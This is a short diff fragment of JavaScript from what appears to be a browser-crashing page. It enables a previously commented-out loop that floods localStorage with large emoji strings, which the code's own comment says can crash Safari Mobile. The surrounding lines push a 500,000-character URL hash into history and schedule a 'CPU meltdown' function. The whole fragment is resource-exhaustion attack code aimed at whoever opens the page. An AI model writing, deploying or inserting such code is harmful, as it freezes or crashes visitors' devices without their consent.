@@ -82,11 +82,11 @@
     history.pushState({}, "", "#" + "X".repeat(500000));
 
     // 8. 🧠 Optional LocalStorage (commented, can crash Safari Mobile if repeated)
-    // try {
-    //   for (let i = 0; i < 10000; i++) {
-    //     localStorage.setItem(`key${i}`, "🧨".repeat(5000));
-    //   }
-    // } catch (e) {}
+     try {
+       for (let i = 0; i < 10000; i++) {
+         localStorage.setItem(`key${i}`, "🧨".repeat(5000));
+       }
+    } catch (e) {}
 
     // 9. 🔥 Launch the final CPU meltdown
     setTimeout(() => burnCPU(), 50);
